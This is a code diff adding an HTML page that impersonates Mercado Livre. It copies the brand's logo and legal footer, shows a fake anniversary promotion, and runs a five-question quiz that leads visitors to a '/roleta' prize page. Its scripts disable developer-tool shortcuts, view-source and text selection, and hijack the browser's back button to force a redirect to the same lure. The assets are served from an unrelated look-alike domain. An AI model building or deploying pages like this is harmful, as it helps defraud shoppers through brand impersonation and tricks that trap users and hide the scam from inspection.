@@ -1,0 +1,349 @@
+
+<html lang="pt-br">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <script src="./quiz/latest.js" data-utmify-fast-start="" async="" defer=""></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="https://recebe-enquantotempml.online/assets/images/favicon.png">
+    <link rel="shortcut icon" href="https://recebe-enquantotempml.online/assets/images/favicon.png">
+    <link rel="stylesheet" href="./quiz/style.css">
+    <link rel="stylesheet" href="./quiz/fonts.css">
+    <link rel="icon" href="https://recebe-enquantotempml.online/index-2.html" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://recebe-enquantotempml.online/index-2.html">
+    {{! <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+
+
+    <style>
+        * {
+            font-family: "Montserrat", sans-serif;
+        }
+    </style> }}
+  </head>
+  <body cz-shortcut-listen="true">
+    <!-- Mirrored from mercadogiro.online/responda/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 30 Aug 2024 02:13:24 GMT -->
+    <script>
+      document.onkeydown = function(e) {
+          if(event.keyCode == 123) {
+              return false;
+          }
+          if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+              return false;
+          }
+          if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+              return false;
+          }
+          if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+              return false;
+          }
+      }
+    </script>
+    <script>
+      function disableselect(e) {
+          return false;
+      }
+      
+      function reEnable() {
+          return true;
+      }
+      
+      document.onselectstart = new Function("return false");
+      
+      if (window.sidebar) {
+          document.onmousedown = disableselect;
+          document.onclick = reEnable;
+      }
+    </script>
+    
+    
+    <title>Mercado Livre</title>
+    <div class="content">
+      <div style="background-color: #e6cf00; text-align: center; padding: 5px;  font-size: 13px; color: white; font-family: 'GellixMedium'">Promoção exclusiva: 25 anos</div>
+      <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+          <img src="./quiz/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+        <div class="logo-central">
+        </div>
+        <div class="menu-icon" style="padding-right: 3%;">
+          <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black"></span>
+        </div>
+      </nav>
+      <div id="progress1" style="display: block">
+        <p style="text-align: center;  font-size: 22px; padding-top: 10px; font-family: 'GellixSemiBold'">Pergunta 1 / 5</p>
+        <div class="progress-container">
+          <div class="progress-bar">
+            <div class="progress"></div>
+          </div>
+        </div>
+      </div>
+      <div id="progress2" style="display: none;">
+        <p style="text-align: center;  font-size: 22px; padding-top: 10px; font-family: 'GellixSemiBold'">Pergunta 2 / 5</p>
+        <div class="progress-container">
+          <div class="progress-bar">
+            <div class="progress2"></div>
+          </div>
+        </div>
+      </div>
+      <div id="progress3" style="display: none;">
+        <p style="text-align: center;  font-size: 22px; padding-top: 10px; font-family: 'GellixSemiBold'">Pergunta 3 / 5</p>
+        <div class="progress-container">
+          <div class="progress-bar">
+            <div class="progress3"></div>
+          </div>
+        </div>
+      </div>
+      <div id="progress4" style="display: none;">
+        <p style="text-align: center;  font-size: 22px; padding-top: 10px; font-family: 'GellixSemiBold'">Pergunta 4 / 5</p>
+        <div class="progress-container">
+          <div class="progress-bar">
+            <div class="progress4"></div>
+          </div>
+        </div>
+      </div>
+      <div id="progress5" style="display: none;">
+        <p style="text-align: center;  font-size: 22px; padding-top: 10px; font-family: 'GellixSemiBold'">Pergunta 5 / 5</p>
+        <div class="progress-container">
+          <div class="progress-bar">
+            <div class="progress5"></div>
+          </div>
+        </div>
+      </div>
+      <div class="pergunta" id="p1">
+        <p class="pergunta_title">Como você avaliaria a experiência de compra no Mercado Livre em termos de facilidade de uso do site ou aplicativo?</p>
+        <div class="radio-container altcontainer">
+          <label class="radiocontainer">
+          Muito fácil
+          <input type="radio" name="difficulty1" value="muito-facil">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Fácil
+          <input type="radio" name="difficulty1" value="facil">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Moderadamente fácil
+          <input type="radio" name="difficulty1" value="moderadamente-facil">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Difícil
+          <input type="radio" name="difficulty1" value="dificil">
+          <span class="checkmark"></span>
+          </label>
+        </div>
+        <button class="pergunta-botao" onclick="showAd2();">Enviar</button>
+        <p class="error-message">Por favor, selecione uma opção.</p>
+        <div style="padding-bottom: 20px;"></div>
+      </div>
+      <div class="pergunta" id="p2" style="display: none">
+        <p class="pergunta_title">Qual é a sua opinião sobre a variedade de produtos disponíveis no Mercado Livre?</p>
+        <div class="radio-container altcontainer">
+          <label class="radiocontainer">
+          Excelente
+          <input type="radio" name="difficulty2" value="excelente">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Boa
+          <input type="radio" name="difficulty2" value="boa">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Aceitável
+          <input type="radio" name="difficulty2" value="aceitavel">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Insatisfatória
+          <input type="radio" name="difficulty2" value="insatisfatoria">
+          <span class="checkmark"></span>
+          </label>
+        </div>
+        <button class="pergunta-botao" onclick="showAd3();">Enviar</button>
+        <p class="error-message">Por favor, selecione uma opção.</p>
+        <div style="padding-bottom: 20px;"></div>
+      </div>
+      <div class="pergunta" id="p3" style="display: none">
+        <p class="pergunta_title">Como você classificaria a eficiência da entrega dos produtos comprados no Mercado Livre?</p>
+        <div class="radio-container altcontainer">
+          <label class="radiocontainer">
+          Rápida
+          <input type="radio" name="difficulty3" value="rapida">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Aceitável
+          <input type="radio" name="difficulty3" value="aceitavel">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Lenta
+          <input type="radio" name="difficulty3" value="lenta">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Muito Lenta
+          <input type="radio" name="difficulty3" value="muito-lenta">
+          <span class="checkmark"></span>
+          </label>
+        </div>
+        <button class="pergunta-botao" onclick="showAd4();">Enviar</button>
+        <p class="error-message">Por favor, selecione uma opção.</p>
+        <div style="padding-bottom: 20px;"></div>
+      </div>
+      <div class="pergunta" id="p4" style="display: none">
+        <p class="pergunta_title">Em relação ao atendimento ao cliente do Mercado Livre, como você o descreveria?</p>
+        <div class="radio-container altcontainer">
+          <label class="radiocontainer">
+          Excelente
+          <input type="radio" name="difficulty4" value="excelente">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Bom
+          <input type="radio" name="difficulty4" value="bom">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Regular
+          <input type="radio" name="difficulty4" value="regular">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Insatisfatório
+          <input type="radio" name="difficulty4" value="insatisfatorio">
+          <span class="checkmark"></span>
+          </label>
+        </div>
+        <button class="pergunta-botao" onclick="showAd5();">Enviar</button>
+        <p class="error-message">Por favor, selecione uma opção.</p>
+        <div style="padding-bottom: 20px;"></div>
+      </div>
+      <div class="pergunta" id="p5" style="display: none">
+        <p class="pergunta_title">Como você avalia a precisão das descrições dos produtos no Mercado Livre?</p>
+        <div class="radio-container altcontainer">
+          <label class="radiocontainer">
+          Muito precisa
+          <input type="radio" name="difficulty5" value="muito-precisa">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Precisa
+          <input type="radio" name="difficulty5" value="precisa">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Moderadamente precisa
+          <input type="radio" name="difficulty5" value="moderadamente-precisa">
+          <span class="checkmark"></span>
+          </label>
+          <label class="radiocontainer">
+          Imprecisa
+          <input type="radio" name="difficulty5" value="imprecisa">
+          <span class="checkmark"></span>
+          </label>
+        </div>
+        <button class="pergunta-botao" id="recompensas">Enviar</button>
+        <p class="error-message">Por favor, selecione uma opção.</p>
+        <div style="padding-bottom: 20px;"></div>
+      </div>
+    </div>
+    <footer class="footer">
+      <p style="margin-left: 3%; margin-right: 3%;  font-size: 14px; padding-top: 5px; font-family: 'GellixSemiBold';"><span style="">Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span><br><br>© 1999-2024 Ebazar.com.br LTDA.CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.<span style="font-family: 'GellixSemiBold';"><br><br>Brasil/Português</span></p>
+    </footer>
+    <script>
+      setTimeout(function () {
+          var button = document.querySelector("#recompensas");
+          
+          // Alterando a variável link para a nova URL
+          var link = "/roleta";
+          
+          button.addEventListener("click", function () {
+              window.location.href = link + window.location.search;
+          });
+      }, 1000);
+      
+      function validateQuestion(questionNumber) {
+          var radios = document.getElementsByName("difficulty" + questionNumber);
+          var isChecked = false;
+          for (var i = 0; i < radios.length; i++) {
+              if (radios[i].checked) {
+                  isChecked = true;
+                  break;
+              }
+          }
+          if (!isChecked) {
+              document.querySelector("#p" + questionNumber + " .error-message").style.display = "block";
+          }
+          return isChecked;
+      }
+      
+      function showAd2() {
+          if (validateQuestion(1)) {
+              document.getElementById("p1").style.display = "none";
+              document.getElementById("p2").style.display = "block";
+              document.getElementById("progress1").style.display = "none";
+              document.getElementById("progress2").style.display = "block";
+          }
+      }
+      
+      function showAd3() {
+          if (validateQuestion(2)) {
+              document.getElementById("p2").style.display = "none";
+              document.getElementById("p3").style.display = "block";
+              document.getElementById("progress2").style.display = "none";
+              document.getElementById("progress3").style.display = "block";
+          }
+      }
+      
+      function showAd4() {
+          if (validateQuestion(3)) {
+              document.getElementById("p3").style.display = "none";
+              document.getElementById("p4").style.display = "block";
+              document.getElementById("progress3").style.display = "none";
+              document.getElementById("progress4").style.display = "block";
+          }
+      }
+      
+      function showAd5() {
+          if (validateQuestion(4)) {
+              document.getElementById("p4").style.display = "none";
+              document.getElementById("p5").style.display = "block";
+              document.getElementById("progress4").style.display = "none";
+              document.getElementById("progress5").style.display = "block";
+          }
+      }
+    </script>
+    <script>
+      // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+    //   ALTERAR LINK
+      const link = '/roleta';
+      
+      function setBackRedirect(url) {
+        let urlBackRedirect = url;
+        urlBackRedirect = urlBackRedirect =
+          urlBackRedirect.trim() +
+          (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+          document.location.search.replace('?', '').toString();
+      
+        history.pushState({}, '', location.href);
+        history.pushState({}, '', location.href);
+        history.pushState({}, '', location.href);
+      
+        window.addEventListener('popstate', () => {
+          console.log('onpopstate', urlBackRedirect);
+          setTimeout(() => {
+            location.href = urlBackRedirect;
+          }, 1);
+        });
+      }
+      
+      setBackRedirect(link);
+    </script>
+  </body>
+</html>
